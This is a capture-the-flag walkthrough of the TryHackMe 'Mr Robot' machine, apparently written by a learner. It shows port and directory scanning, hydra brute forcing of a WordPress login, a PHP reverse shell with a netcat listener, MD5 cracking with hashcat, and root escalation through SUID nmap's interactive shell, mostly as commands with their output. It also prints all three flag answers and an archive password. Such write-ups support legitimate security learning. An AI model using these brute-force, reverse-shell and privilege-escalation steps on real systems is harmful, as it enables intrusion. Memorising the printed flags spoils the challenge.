# Mr Robot CTF

Based on the Mr. Robot show, can you root this box?

[Mr Robot CTF](https://tryhackme.com/room/mrrobot)

## Topic's

- Network Enumeration
- Web Enumeration
- Brute Forcing (Wordpress)
- Brute Forcing (Hash)
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Connect to our network

To deploy the Mr. Robot virtual machine, you will first need to connect to our network.

1. Connect to our network using OpenVPN. Here is a mini walkthrough of connecting: Go to your access page and download your configuration file.

![](https://i.gyazo.com/c86eba5538466dc1d948e09b6f14b53b.png)

`No answer needed`

2. Use an OpenVPN client to connect. In my example I am on Linux, on the access page we have a windows tutorial.
   ![](https://i.gyazo.com/42083cc1831acad79e5a6fa2b235792f.png) (change "ben.ovpn" to your config file) When you run this you see lots of text, at the end it will say Initialization Sequence Completed

`No answer needed`

3. You can verify you are connected by looking on your access page. Refresh the page. You should see a green tick next to Connected. It will also show you your internal IP address.

![](https://i.gyazo.com/fad648871fd0e51d1d5590d005329f1c.png)

You are now ready to use our machines on our network!

`No answer needed`

4. Now when you deploy material, you will see an internal IP address of your Virtual Machine.

`No answer needed`

## Hack the machine

![](https://i.imgur.com/mp5JwKO.png)

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

Credit to [Leon Johnson](https://twitter.com/@sho_luv) for creating this machine. This machine is used here with the explicit permission of the creator <3

```
sudo nmap -sS -sC -sV -A -Pn 10.10.239.79
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 20:06 CEST
Nmap scan report for 10.10.239.79
Host is up (0.081s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Device type: general purpose|specialized|storage-misc|WAP|printer
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|2.4.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:2.4
Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%), Linux 3.12 (89%), Linux 3.2 - 3.5 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   36.87 ms 10.8.0.1
2   82.64 ms 10.10.239.79

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.78 seconds
```

```
sudo nikto -host http://10.10.239.79
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.239.79
+ Target Hostname:    10.10.239.79
+ Target Port:        80
+ Start Time:         2020-09-29 20:41:30 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
```

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.239.79

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.239.79
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/29 20:07:17 Starting gobuster
===============================================================
/images (Status: 301)
/blog (Status: 301)
[ERROR] 2020/09/29 20:07:41 [!] Get http://10.10.239.79/about: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/sitemap (Status: 200)
/rss (Status: 301)
[ERROR] 2020/09/29 20:07:47 [!] Get http://10.10.239.79/cgi-bin: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/09/29 20:07:56 [!] net/http: request canceled (Client.Timeout exceeded while reading body)
/login (Status: 302)
[ERROR] 2020/09/29 20:08:10 [!] Get http://10.10.239.79/register: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/09/29 20:08:15 [!] net/http: request canceled (Client.Timeout exceeded while reading body)
[ERROR] 2020/09/29 20:08:20 [!] Get http://10.10.239.79/14: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/0 (Status: 301)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/wp-login (Status: 200)
/intro (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)
/%20 (Status: 301)
[ERROR] 2020/09/29 20:39:17 [!] Get http://10.10.239.79/icon_arrow: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
Progress: 4814 / 220561 (2.18%)
```

Found Robot.txt: http://10.10.239.79/robots.txt

First Flag: http://10.10.239.79/key-1-of-3.txt

`073403c8a58a1f80d943455fb30724b9`

## Wordpress

http://10.10.239.79/wp-login

```
hydra -L fsocity.dic -p test 10.10.239.79 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-29 20:50:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.239.79:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username
[80][http-post-form] host: 10.10.239.79   login: Elliot   password: test
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

`Elliot`

```
sort fsocity.dic | uniq > fsocity_sorted.dic
```

`hydra -l Elliot -P fsocity_sorted.dic 10.10.239.79 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302"`

```
[80][http-post-form] host: 10.10.157.219   login: "Elliot"  password: "ER28-0652"
```

[http://10.10.239.79/wp-admin/](http://10.10.239.79/wp-admin/)

php_reverse_shell

nc -nlvp 9001

![](2020-09-29_22-00.png)

[http://10.10.239.79/pwned](http://10.10.239.79/pwned)

```
python -c "import pty; pty.spawn('/bin/bash')"

daemon@linux:/$ ls -la /home
ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
daemon@linux:/$ ls -la /home/robot
ls -la /home/robot
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

export TERM=xterm

cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

hashcat -m 0 --force hash /usr/share/wordlists/rockyou.txt
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz, 512/1493 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Tue Sep 29 22:09:23 2020 (0 secs)
Time.Estimated...: Tue Sep 29 22:09:23 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   123.2 kH/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 40960/14344385 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 38912/14344385 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: treetree -> loserface1

Started: Tue Sep 29 22:09:15 2020
Stopped: Tue Sep 29 22:09:24 2020
```

`abcdefghijklmnopqrstuvwxyz`

```
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

`822c73956184f694993bede3eb39f959`

```
find / -perm -u=s -type f 2> /dev/null

/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

[https://pentestlab.blog/2017/09/25/suid-executables/](https://pentestlab.blog/2017/09/25/suid-executables/)

```
nmap --interactive

nmap> !sh
!sh
# whoami
whoami
root
# cd /root
cd /root
# ls -l
ls -l
total 4
-rw-r--r-- 1 root root  0 Nov 13  2015 firstboot_done
-r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

`04787ddef27c3dee1ee161b21670b4e4`

1. What is key 1?

- `073403c8a58a1f80d943455fb30724b9`

2. What is key 2?

- `822c73956184f694993bede3eb39f959`

3. What is key 3?

- `04787ddef27c3dee1ee161b21670b4e4`
